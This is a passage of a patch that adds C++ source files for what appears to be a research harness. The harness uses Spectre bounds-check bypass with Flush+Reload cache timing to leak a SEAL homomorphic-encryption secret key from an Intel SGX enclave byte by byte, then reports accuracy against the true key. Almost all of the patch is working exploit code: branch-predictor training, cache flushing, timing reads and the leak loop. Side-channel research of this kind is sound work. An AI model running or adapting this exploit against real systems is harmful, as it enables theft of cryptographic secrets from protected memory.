+			finished_byte = LEN-len;
+		}
+
+
+#if DEBUG
+		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
+		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		if (score[1] > 0)
+			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+		printf("\n");
+#endif
+	}
+	return (0);
+}
+
+void printByteArray(const unsigned char *array, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        printf("%02X ", array[i]);
+    }
+    printf("\n");
+}
+
+void checkResult(int cnt) {
+
+	int count = 0;
+	const uint8_t *sk = (const uint8_t *)secretKey;
+	for(int i = 0; i < finished_byte; i++) {
+		//if(result[i] == sk[8*N-i-1]) count++;
+		if(result[i] == sk[i]) count++;
+		else printf("missed : i = %d, sk = %02X, result = %02X\n", i, sk[i], result[i]);
+	}
+	// printByteArray(result, LEN);
+
+
+	double accr = 100.000 * (double)count/finished_byte;
+	printf("Accuracy = %.3f %% (%d/%d)[bytes]\n", accr, count, finished_byte);
+	printf("Total time = %.3f [s]\n", read_byte[1]);
+
+	string fname_state = "l"+to_string(learn_loop);
+	fname_state += "t";
+	fname_state += to_string(global_tries);
+
+	outputResult(read_byte, cnt, accr, "read_byte"+fname_state, 2, 2);
+	outputResult(exec_times[0], 0, 0, string("exec_times")+fname_state, finished_byte-1, 2);
+#if MESURE_EACH
+	outputResult(exec_times[1], 1, 0, "exec_times", finished_byte, 2);
+	outputResult(exec_times[2], 2, 0, "exec_times", finished_byte, 2);
+#endif
+}
+
+
+
+/* Application entry */
+int main(int argc, char *argv[])
+{
+    /* Initialize the enclave */
+    initialize_enclave();
+
+	readSecretKey("secret_key", secretKey);
+	readCiphertext("ciphertext", ciphertext);
+	// printByteArray((char*)secretKey, LEN);
+	
+	SGX_ASSERT(ecall_load_key(global_eid, secretKey));
+
+    /* Call the main attack function*/
+	for(int i = 0; i < EXEC_NUM; i++) {
+		learn_loop = 2; global_tries = 1;
+		spectre_main(argc, argv);
+		checkResult(i);
+	
+		learn_loop = 2; global_tries = 2;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 3;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 5;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 10;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 21;
+		spectre_main(argc, argv);
+		checkResult(i);
+	}
+
+    /* Destroy the enclave */
+	destroy_enclave();
+
+    return 0;
+};
+
diff -uprN orig/main/main.cpp~ code/main/main.cpp~
--- orig/main/main.cpp~	1970-01-01 09:00:00.000000000 +0900
+++ code/main/main.cpp~	2024-07-26 12:13:56.134276330 +0900
@@ -0,0 +1,360 @@
+/*
+ * Copyright 2018 Imperial College London
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at   
+ * 
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ * 
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+// #define _GNU_SOURCE
+#include "pthread.h"
+#include <errno.h>
+#include <signal.h>
+#include <sched.h>
+
+#pragma comment (lib, "pthreadVC2.lib")
+
+#include <stdio.h>
+#include <string.h>
+#include <assert.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <time.h>
+#include <iostream>
+#include <chrono>
+#ifdef _MSC_VER
+#include <intrin.h> /* for rdtscp and clflush */
+#pragma optimize("gt",on)
+#else
+#include <x86intrin.h> /* for rdtscp and clflush */
+#endif
+
+#include "enclave_u.h"
+#include "enclave_init.h"
+#include "utils.hpp"
+
+struct pp_arg_struct {
+	int junk;
+	int tries;
+	int *results;
+};
+
+struct pt_arg_struct {
+	size_t malicious_x; 
+	int tries;
+};
+
+#define LEN 65536		//64KiB: 65536, 128KiB: 131072,	256KiB: 262144
+#define N 8192			//64KiB: 8192, 128KiB: 16384,	256KiB: 32768
+#define FIX_CPU_CORE 0
+#define DEBUG 0
+#define MESURE_EACH 0
+#define ACCESS_FREQ 6
+#define LEARN_LOOP 20	//20, 30, 40
+#define TRIES 100		//100, 250, 500, 1000
+#define EXEC_NUM 100
+#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */
+
+using namespace std;
+
+extern sgx_enclave_id_t global_eid;
+
+unsigned int array1_size = 16;
+uint8_t unused1[64];
+uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
+uint8_t unused2[64];
+uint8_t array2[256 * 512];
+uint64_t secretKey[N];
+uint64_t ciphertext[2][N];
+uint64_t plaintext[N];
+
+uint8_t result[LEN+1];
+double exec_times[3][LEN];
+double read_byte[2];
+int finished_byte = 0;
+int ret = 0;
+int ten_s_cnt = 1;
+
+int learn_loop = 20;
+int global_tries = 100;
+
+/********************************************************************
+ Analysis code
+********************************************************************/
+////////////////////////////////////////////////////////////////////
+//		Flush+Reload
+////////////////////////////////////////////////////////////////////
+
+ #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+
+ /* Report best guess in value[0] and runner-up in value[1] */
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int len) {
+	static int results[256];
+	int tries, i, j, k, mix_i; 
+	unsigned int junk = 0;
+	size_t training_x, x;
+	register uint64_t time1, time2;
+	volatile uint8_t *addr;
+	struct timespec start_time, end_time;
+	double execution_time = 0;
+
+	for (i = 0; i < 256; i++)
+		results[i] = 0;
+
+	for (tries = global_tries; tries > 0; tries--) {
+		/* Flush array2[256*(0..255)] from cache */
+		for (i = 0; i < 256; i++)
+		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &start_time);
+#endif
+		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+		training_x = tries % array1_size;
+		for (j = learn_loop; j >= 0; j--) {
+			_mm_clflush(&array1_size);
+			volatile int z;
+			//for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+			
+			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+			/* Avoid jumps in case those tip off the branch predictor */
+			x = ((j % ACCESS_FREQ) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+			x = training_x ^ (x & (malicious_x ^ training_x));
+			
+			/* Call the victim! */ 
+			// SGX_ASSERT(ecall_victim_function(global_eid, x, array2, &array1_size));
+			SGX_ASSERT(ecall_decrypt(global_eid, x, ciphertext[0], ciphertext[1], plaintext, array2, &array1_size));
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[0][LEN-len-1] = execution_time;
+#endif
+
+		
+		//clock_gettime(CLOCK_MONOTONIC, &start_time);
+		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		for (i = 0; i < 256; i++) {
+			mix_i = ((i * 167) + 13) & 255;
+			addr = &array2[mix_i * 512];
+			time1 = __rdtscp(&junk); /* READ TIMER */
+			junk = *addr; /* MEMORY ACCESS TO TIME */
+			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			//if (time2 <= CACHE_HIT_THRESHOLD)
+			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
+			{
+				results[mix_i]++; /* cache hit - add +1 to score for this value */
+			}
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[1][LEN-len-1] = execution_time;
+#endif
+		
+
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &start_time);
+#endif
+		/* Locate highest & second-highest results results tallies in j/k */
+		j = k = -1;
+		for (i = 0; i < 256; i++) {
+			if (j < 0 || results[i] >= results[j]) {
+				k = j;
+				j = i;
+			} else if (k < 0 || results[i] >= results[k]) {
+				k = i;
+			}
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[2][LEN-len-1] = execution_time;
+#endif
+
+		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+	}
+
+	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+	value[0] = (uint8_t)j;
+	score[0] = results[j];
+	value[1] = (uint8_t)k;
+	score[1] = results[k];
+}
+
+
+
+/////////////////////////////////////////////////////////////////////////
+// Spectre Main
+//////////////////////////////////////////////////////////////////////////
+
+int spectre_main(int argc, char **argv) {
+
+#if FIX_CPU_CORE	
+	//fix cpu core******************************************************
+    cpu_set_t cur_mask, new_mask;
+    size_t length = sizeof(cur_mask);
+    pid_t pid = getpid();
+ 
+    // 現在の設定値を取得・表示 
+    if (sched_getaffinity(0, length, &cur_mask)) {
+        perror("sched_getaffinity");
+        return -1;
+    }
+    printf("pid %d's old affinity: %08lx\n", pid, *(unsigned long*)cur_mask.__bits);
+ 
+    // mask を CPU1 のみに設定 
+    CPU_ZERO(&new_mask);
+    CPU_SET(1, &new_mask);
+ 
+    // mask 値を反映 
+    if (sched_setaffinity(0, length, &new_mask)) {
+        perror("sched_setaffinity");
+        return -1;
+    }
+	printf("pid %d's new affinity: %08lx\n", pid, *(unsigned long*)new_mask.__bits);
+	//*******************************************************************
+#endif
+
+	size_t malicious_x; 
+	SGX_ASSERT(ecall_get_offset(global_eid, &malicious_x)); /* default for malicious_x */
+	//malicious_x += N*8-1;
+
+	int i, score[2];
+	int len = LEN;
+	uint8_t value[2];
+	struct timespec start_time, end_time;
+	chrono::system_clock::time_point  start, end;
+	double execution_time = 0;
+	double total_execution_time = 0;
+	
+	for (i = 0; i < sizeof(array2); i++)
+		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+
+	if (argc == 3) {
+		sscanf(argv[1], "%p", (void**)(&malicious_x));
+		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
+		sscanf(argv[2], "%d", &len);
+	}
+
+	printf("Reading %d bytes:\n", len);
+	while (--len >= 0) {
+		//printf("Reading at malicious_x = %p... ", (void*)malicious_x);
+		start = chrono::system_clock::now();
+		readMemoryByte(malicious_x++, value, score, len);	//++ OR --
+		end = chrono::system_clock::now();
+		result[LEN-len-1] = value[0];
+
+		execution_time = chrono::duration_cast<std::chrono::nanoseconds>(end-start).count() / 1000000000.00; //[s]
+		total_execution_time += execution_time;
+		exec_times[0][LEN-len-1] = execution_time;
+
+		if(len <= 0) {
+			printf("finished\n");
+			read_byte[0] = LEN-len;
+			read_byte[1] = total_execution_time;
+			finished_byte = LEN-len;
+		}
+
+
+#if DEBUG
+		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
+		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		if (score[1] > 0)
+			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+		printf("\n");
+#endif
+	}
+	return (0);
+}
+
+void printByteArray(const unsigned char *array, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        printf("%02X ", array[i]);
+    }
+    printf("\n");
+}
+
+void checkResult(int cnt) {
+
+	int count = 0;
+	const uint8_t *sk = (const uint8_t *)secretKey;
+	for(int i = 0; i < finished_byte; i++) {
+		//if(result[i] == sk[8*N-i-1]) count++;
+		if(result[i] == sk[i]) count++;
+		else printf("missed : i = %d, sk = %02X, result = %02X\n", i, sk[i], result[i]);
+	}
+	// printByteArray(result, LEN);
+
+
+	double accr = 100.000 * (double)count/finished_byte;
+	printf("Accuracy = %.3f %% (%d/%d)[bytes]\n", accr, count, finished_byte);
+	printf("Total time = %.3f [s]\n", read_byte[1]);
+
+	string fname_state = "l"+to_string(learn_loop);
+	fname_state += "t";
+	fname_state += to_string(global_tries);
+
+	outputResult(read_byte, cnt, accr, "read_byte"+fname_state, 2, 2);
+	outputResult(exec_times[0], 0, 0, string("exec_times")+fname_state, finished_byte-1, 2);
+#if MESURE_EACH
+	outputResult(exec_times[1], 1, 0, "exec_times", finished_byte, 2);
+	outputResult(exec_times[2], 2, 0, "exec_times", finished_byte, 2);
+#endif
+}
+
+
+
+/* Application entry */
+int main(int argc, char *argv[])
+{
+    /* Initialize the enclave */
+    initialize_enclave();
+
+	readSecretKey("secret_key", secretKey);
+	readCiphertext("ciphertext", ciphertext);
+	// printByteArray((char*)secretKey, LEN);
+	
+	SGX_ASSERT(ecall_load_key(global_eid, secretKey));
+
+    /* Call the main attack function*/
+	for(int i = 0; i < EXEC_NUM; i++) {
+		learn_loop = 2; global_tries = 1;
+		spectre_main(argc, argv);
+		checkResult(i);
+	
+		learn_loop = 2; global_tries = 2;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 3;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 5;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 10;
+		spectre_main(argc, argv);
+		checkResult(i);
+
+		learn_loop = 2; global_tries = 21;
+		spectre_main(argc, argv);
+		checkResult(i);
+	}
+
+    /* Destroy the enclave */
+	destroy_enclave();
+
+    return 0;
+};
+
diff -uprN orig/main/utils.cpp code/main/utils.cpp
--- orig/main/utils.cpp	1970-01-01 09:00:00.000000000 +0900
+++ code/main/utils.cpp	2024-07-26 13:02:27.242002821 +0900
@@ -0,0 +1,76 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <fstream>
+#include <iostream>
+#include <chrono>
+#include <unordered_map>
+#include <stack>
+#include <string>
+#include <seal/seal.h>
+#include "utils.hpp"
+
+using namespace std;
+
+void readSecretKey(const char *fname, uint64_t *dest) {
+
+    std::ifstream spar("parms", std::ios::in | std::ios::out | std::ios::binary);
+    std::ifstream ssk(fname, std::ios::in | std::ios::out | std::ios::binary);
+
+    seal::EncryptionParameters parms;
+    parms.load(spar);
+    shared_ptr<seal::SEALContext> context(new seal::SEALContext(parms));
+    std::cout << "loaded parameters. N = " << parms.poly_modulus_degree() << std::endl;
+
+    /// Load seal keys 
+    cout << "Loading secretkey..." << endl;
+    shared_ptr<seal::SecretKey> sk(new seal::SecretKey);
+    sk->load(*context, ssk);
+    std::cout << "loaded secret_key" << endl;
+
+    //my_copy(parms.poly_modulus_degree(), sk->data().dyn_array(), dest);
+    // std::copy(sk->data().dyn_array().cbegin(), sk->data().dyn_array().cend(), dest);
+    for (size_t i = 0; i < N; ++i) dest[i] = sk->data().dyn_array()[i];
+}
+
+void readCiphertext(const char *fname, uint64_t dest[][N]) {
+    std::ifstream scp(fname, std::ios::in | std::ios::out | std::ios::binary);
+    std::ifstream spar("parms", std::ios::in | std::ios::out | std::ios::binary);
+
+    seal::EncryptionParameters parms;
+    parms.load(spar);
+    shared_ptr<seal::SEALContext> context(new seal::SEALContext(parms));
+
+    cout << "Loading ciphertext..." << endl;
+    shared_ptr<seal::Ciphertext> cp(new seal::Ciphertext);
+    cp->load(*context, scp);
+    std::cout << "loaded ciphertext" << endl;
+
+    //my_copy(parms.poly_modulus_degree(), cp->data(0)[0], dest[0]);
+    //my_copy(parms.poly_modulus_degree(), cp->data(1)[0], dest[1]);
+    //std::copy(cp->data(0)[0], cp->data(0)[N-1], dest[0]);
+    //std::copy(cp->data(1)[0], cp->data(1)[N-1], dest[1]);
+    for (size_t i = 0; i < N; ++i) {
+        dest[0][i] = cp->data(0)[i];
+        dest[1][i] = cp->data(1)[i];
+    }
+}
+
+void outputResult(double *read_byte, int cnt, double accr, string strfname, int len, int mode) {
+    //string strfname(fname);
+    string str = "results/"+strfname+"_";
+    str += to_string(cnt);
+    ofstream outputfile(str);
+    if(mode == 1) {
+        for(int i = 0; i < len; i++) {
+            outputfile << read_byte[i+1] - read_byte[i] << "\n";
+        }
+    }else if(mode == 2) {
+        for(int i = 0; i < len; i++) {
+            outputfile << read_byte[i] << "\n";
+        }
+    }else{
+        printf("no matching\n");
+    }
+    outputfile << accr << "\n";
+    outputfile.close();
+}
diff -uprN orig/main/utils.cpp~ code/main/utils.cpp~
--- orig/main/utils.cpp~	1970-01-01 09:00:00.000000000 +0900
+++ code/main/utils.cpp~	2024-07-26 12:13:56.134276330 +0900
@@ -0,0 +1,76 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <fstream>
+#include <iostream>
+#include <chrono>
+#include <unordered_map>
+#include <stack>
+#include <string>
+#include <seal/seal.h>
+#include "utils.hpp"
+#define N 8192     //64KiB: 8192, 128KiB: 16384,  256KiB: 32768
+using namespace std;
+
+void readSecretKey(const char *fname, uint64_t *dest) {
+
+    std::ifstream spar("parms", std::ios::in | std::ios::out | std::ios::binary);
+    std::ifstream ssk(fname, std::ios::in | std::ios::out | std::ios::binary);
+
+    seal::EncryptionParameters parms;
+    parms.load(spar);
+    shared_ptr<seal::SEALContext> context(new seal::SEALContext(parms));
+    std::cout << "loaded parameters. N = " << parms.poly_modulus_degree() << std::endl;
+
+    /// Load seal keys 
+    cout << "Loading secretkey..." << endl;
+    shared_ptr<seal::SecretKey> sk(new seal::SecretKey);
+    sk->load(*context, ssk);
+    std::cout << "loaded secret_key" << endl;
+
+    //my_copy(parms.poly_modulus_degree(), sk->data().dyn_array(), dest);
+    // std::copy(sk->data().dyn_array().cbegin(), sk->data().dyn_array().cend(), dest);
+    for (size_t i = 0; i < N; ++i) dest[i] = sk->data().dyn_array()[i];
+}
+
+void readCiphertext(const char *fname, uint64_t dest[][N]) {
+    std::ifstream scp(fname, std::ios::in | std::ios::out | std::ios::binary);
+    std::ifstream spar("parms", std::ios::in | std::ios::out | std::ios::binary);
+
+    seal::EncryptionParameters parms;
+    parms.load(spar);
+    shared_ptr<seal::SEALContext> context(new seal::SEALContext(parms));
+
+    cout << "Loading ciphertext..." << endl;
+    shared_ptr<seal::Ciphertext> cp(new seal::Ciphertext);
+    cp->load(*context, scp);
+    std::cout << "loaded ciphertext" << endl;
+
+    //my_copy(parms.poly_modulus_degree(), cp->data(0)[0], dest[0]);
+    //my_copy(parms.poly_modulus_degree(), cp->data(1)[0], dest[1]);
+    //std::copy(cp->data(0)[0], cp->data(0)[N-1], dest[0]);
+    //std::copy(cp->data(1)[0], cp->data(1)[N-1], dest[1]);
+    for (size_t i = 0; i < N; ++i) {
+        dest[0][i] = cp->data(0)[i];
+        dest[1][i] = cp->data(1)[i];
+    }
+}
+
+void outputResult(double *read_byte, int cnt, double accr, string strfname, int len, int mode) {
+    //string strfname(fname);
+    string str = "results/"+strfname+"_";
+    str += to_string(cnt);
+    ofstream outputfile(str);
+    if(mode == 1) {
+        for(int i = 0; i < len; i++) {
+            outputfile << read_byte[i+1] - read_byte[i] << "\n";
+        }
+    }else if(mode == 2) {
+        for(int i = 0; i < len; i++) {
+            outputfile << read_byte[i] << "\n";
+        }
+    }else{
+        printf("no matching\n");
+    }
+    outputfile << accr << "\n";
+    outputfile.close();
+}
diff -uprN orig/main/utils.hpp code/main/utils.hpp
--- orig/main/utils.hpp	1970-01-01 09:00:00.000000000 +0900
+++ code/main/utils.hpp	2024-07-26 13:02:49.518069608 +0900
@@ -0,0 +1,38 @@
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string>
+
+#define LEN 65536		//64KiB: 65536, 128KiB: 131072,	256KiB: 262144
+#define N 8192			//64KiB: 8192, 128KiB: 16384,	256KiB: 32768
+#define FIX_CPU_CORE 0
+#define DEBUG 0
+#define MESURE_EACH 0
+#define ACCESS_FREQ 6
+#define LEARN_LOOP 20	//20, 30, 40
+#define TRIES 100		//100, 250, 500, 1000
+#define EXEC_NUM 100
+#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */
+
+extern int ret;
+
+#define SGX_ASSERT(f)  { if ( 0 != (ret = (f)) )                \
+ {                                                                      \
+       printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__,  \
+                                              __LINE__, ret);   \
+        abort();                                                        \
+ } }
+
+    double* readData(char *fname, int len);
+    void readSecretKey(const char *fname, uint64_t *dest);
+    void readCiphertext(const char *fname, uint64_t dest[][N]);
+    void outputResult(double read_byte[10], int cnt, double accr, std::string strfname, int len, int mode);
+
+#ifdef __cplusplus
+}
+#endif
diff -uprN orig/main/utils.hpp~ code/main/utils.hpp~
--- orig/main/utils.hpp~	1970-01-01 09:00:00.000000000 +0900
+++ code/main/utils.hpp~	2024-07-26 12:23:19.730482978 +0900
@@ -0,0 +1,28 @@
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string>
+
+#define N 8192     //64KiB: 8192, 128KiB: 16384,  256KiB: 32768
+extern int ret;
+
+#define SGX_ASSERT(f)  { if ( 0 != (ret = (f)) )                \
+ {                                                                      \
+       printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__,  \
+                                              __LINE__, ret);   \
+        abort();                                                        \
+ } }
+
+    double* readData(char *fname, int len);
+    void readSecretKey(const char *fname, uint64_t *dest);
+    void readCiphertext(const char *fname, uint64_t dest[][N]);
+    void outputResult(double read_byte[10], int cnt, double accr, std::string strfname, int len, int mode);
+
+#ifdef __cplusplus
+}
+#endif
